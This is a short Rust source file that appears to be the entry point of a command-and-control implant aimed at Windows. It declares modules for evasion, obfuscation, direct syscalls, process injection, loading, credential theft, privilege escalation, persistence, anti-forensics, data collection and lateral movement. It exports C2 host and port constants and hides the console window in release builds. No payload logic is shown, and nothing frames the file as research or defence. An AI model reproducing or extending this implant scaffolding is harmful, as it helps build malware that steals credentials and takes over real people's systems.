#![cfg_attr(all(not(debug_assertions), target_os = "windows"), windows_subsystem = "windows")]

mod channel;
mod crypto;
mod evasion;
mod executor;
mod obfs;
mod task;
mod fingerprint;
mod filemgr;
mod agent_loop;

#[cfg(target_os = "windows")]
mod syscall;
#[cfg(target_os = "windows")]
mod inject;
#[cfg(target_os = "windows")]
mod loader;
#[cfg(target_os = "windows")]
mod cred;
#[cfg(target_os = "windows")]
mod discovery;
#[cfg(target_os = "windows")]
mod privesc;
#[cfg(target_os = "windows")]
mod persist;
#[cfg(target_os = "windows")]
mod antifor;
#[cfg(target_os = "windows")]
mod collect;
#[cfg(target_os = "windows")]
mod lateral;

pub use agent_loop::{Session, C2_HOST, C2_PORT, BUILD_UUID};

fn main() {
    agent_loop::run();
}
